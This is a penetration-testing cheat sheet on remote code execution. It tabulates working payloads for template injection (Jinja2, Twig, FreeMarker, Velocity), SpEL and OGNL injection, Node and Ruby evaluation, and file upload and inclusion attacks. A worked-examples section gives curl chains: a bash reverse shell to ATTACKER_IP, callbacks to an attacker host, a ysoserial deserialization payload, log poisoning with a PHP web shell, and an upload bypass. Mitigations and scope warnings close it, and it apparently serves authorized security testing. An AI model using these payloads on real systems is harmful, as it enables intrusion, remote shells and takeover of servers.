
## Server-Side Template Injection (SSTI) → RCE

| Technique | Payload | Purpose |
|---|---|---|
| Detection probe | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` | If the response reflects `49` instead of the literal string, user input is being evaluated as a template expression, not just rendered as text |
| Jinja2 (Python) RCE | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` | Jinja2 sandboxes are commonly bypassable by walking Python's object graph back to `__builtins__` from any object in scope |
| Twig (PHP) RCE | `{{ ['id'] \| map('system') \| join }}` | Abuses Twig filter chaining to reach a PHP function capable of shell execution |
| FreeMarker (Java) RCE | `<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}` | `Execute` is a built-in FreeMarker utility class that directly shells out, intended for trusted templates only |
| Velocity (Java) RCE | `#set($e="exec")$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")` | Same object-graph-walking concept against the Velocity engine when direct class references are restricted |

## Expression Language / Code Evaluation Injection

| Technique | Payload | Purpose |
|---|---|---|
| Spring EL (SpEL) injection | `${T(java.lang.Runtime).getRuntime().exec('id')}` | If user input reaches a Spring EL evaluation context (common in some validation annotations, older Spring Security configs), this directly invokes `Runtime.exec` |
| OGNL injection (Struts-family) | `%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}` | OGNL is a Java expression language historically chained for high-profile RCE CVEs (e.g. Struts2); the payload disables member-access restrictions before invoking `ProcessBuilder` |
| Node.js `vm`/`eval` injection | `require('child_process').execSync('id').toString()` (submitted where the app `eval()`s or passes to a poorly-sandboxed `vm` context) | Node's built-in `vm` module is explicitly documented as not a security boundary — anything reaching it with `require` accessible can escape to full Node API access |
| Ruby `eval`/YAML injection | `YAML.load("--- !ruby/object:Gem::Requirement\n...")` (unsafe `YAML.load` deserializing a Ruby object) | Ruby's `YAML.load` (pre-Psych-safe-mode defaults) can instantiate arbitrary objects, chained similarly to Java/PHP deserialization gadgets |

## File Upload / Inclusion → RCE

| Technique | Payload (conceptual) | Purpose |
|---|---|---|
| Web shell upload via extension bypass | Upload `shell.php.jpg`, `shell.pHp`, or `shell.php%00.jpg` (null-byte legacy bypass) as an "image" | Tests whether extension/content-type validation is the only control, and whether the upload directory is web-accessible/executable |
| Polyglot file upload | A file that is simultaneously a valid GIF and valid PHP (`GIF89a;<?php system($_GET['c']); ?>`) | Bypasses magic-byte/content-sniffing validation while still parsing as executable code if the server processes it as PHP |
| Local File Inclusion (LFI) → RCE via log poisoning | Inject `<?php system($_GET['c']); ?>` into a request header (e.g. `User-Agent`) that gets written to an access log, then `include` the log file via an LFI parameter | Combines an LFI primitive with a write-what-you-include channel the attacker doesn't otherwise have direct upload access to |
| LFI → RCE via PHP wrappers | `?page=php://filter/convert.base64-encode/resource=index.php` (read) or `?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==` (execute, if `allow_url_include` is on) | `php://` and `data://` stream wrappers can turn a file-inclusion bug directly into code execution without needing a separate upload vector |
| ZIP/archive extraction path traversal (Zip Slip) → RCE | Crafted archive entry named `../../../var/www/html/shell.php` extracted by a vulnerable unzip routine | Writes an attacker-controlled file outside the intended extraction directory, into a web-executable location |

## EXAMPLE PAYLOADS

**OS command injection — full chain with reverse shell:**
```bash
# 1. Confirm injection (time-based, since no output channel)
curl -X POST -d 'host=127.0.0.1;sleep 10' [URL]/ping

# 2. Confirm with OOB callback
curl -X POST -d 'host=127.0.0.1;curl http://attacker-oob.com/hit' [URL]/ping

# 3. Escalate to interactive shell
curl -X POST -d 'host=127.0.0.1;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' [URL]/ping
```

**Jinja2 SSTI full chain:**
```python
# 1. Detection
{{7*7}}
# Response contains 49 -> confirmed SSTI

# 2. RCE
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Java deserialization via ysoserial (conceptual):**
```bash
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker-oob.com/hit' > payload.bin
curl -X POST --data-binary @payload.bin -H 'Content-Type: application/x-java-serialized-object' [URL]/api/load
```

**LFI to RCE via log poisoning:**
```bash
# 1. Poison the access log via User-Agent
curl -A '<?php system($_GET["c"]); ?>' [URL]/

# 2. Include the log file and trigger execution
curl '[URL]/index.php?page=../../../../var/log/apache2/access.log&c=id'
```

**File upload extension bypass:**
```bash
curl -F 'file=@shell.php.jpg;filename=shell.php.jpg;type=image/jpeg' \
  -F 'PHP_CONTENT=<?php system($_GET["c"]); ?>' \
  [URL]/upload
```

## Tooling Note

Manual probing builds understanding of the underlying flaw, but dedicated tools automate most of these checks against a live target in one pass: **ysoserial** / **ysoserial.net** for Java/.NET deserialization gadget chains, **tplmap** for automated SSTI detection and exploitation across engines, **Commix** for automated command injection detection, and **revshells.com** for generating context-appropriate reverse shell one-liners. Stay within strict authorized scope and a pre-agreed rules of engagement — RCE is the highest-impact finding class possible and any payload beyond the agreed proof-of-concept (e.g. `id`/`whoami`/`sleep`) risks causing real, irreversible damage to production systems.

## Mitigations (for writeups)

- Never construct shell commands by concatenating user input — use parameterized APIs (`subprocess.run([...])` with a list, not `shell=True`) that don't invoke a shell interpreter at all.
- Never deserialize untrusted data with formats capable of arbitrary object instantiation (Java native serialization, Python `pickle`, PHP `unserialize()`, unsafe YAML) — use data-only formats (JSON) or signed/integrity-checked payloads instead.
- Use a logic-less or sandboxed template engine for any template rendered with user-influenced content, and never pass user input directly into `render_template_string`-style APIs.
- Avoid exposing expression-language evaluation (SpEL, OGNL, EL) to any user-controlled input; if dynamic evaluation is unavoidable, use a strict, audited allowlist-based evaluator instead of the full language.
- Validate file uploads by content (magic bytes, re-encoding images) rather than extension/content-type alone, store uploads outside the web root or in non-executable storage, and serve them with a fixed, non-executable content type.
- Validate and canonicalize any path used in file inclusion/reading against an allowlist of expected files; never let user input directly select an arbitrary path, and disable dangerous stream wrappers (`allow_url_include`) where not required.
- Run application processes with least-privilege OS accounts so a successful RCE has minimal lateral/escalation value even if achieved.

## Quick Notes

- RCE is an impact category, not a root cause — always identify and name the specific underlying flaw (command injection, deserialization, SSTI, EL injection, file upload/inclusion) for an accurate writeup rather than just "RCE was achieved."
- Confirm execution with the least invasive payload that proves the point (`sleep`, OOB callback, `id`/`whoami`) before ever considering a reverse shell — a confirmed sandboxed proof is sufficient for almost any report.
- A successful RCE finding is typically the highest severity possible in any assessment; treat scope, authorization, and blast-radius limits as non-negotiable regardless of how easy the path in turns out to be.
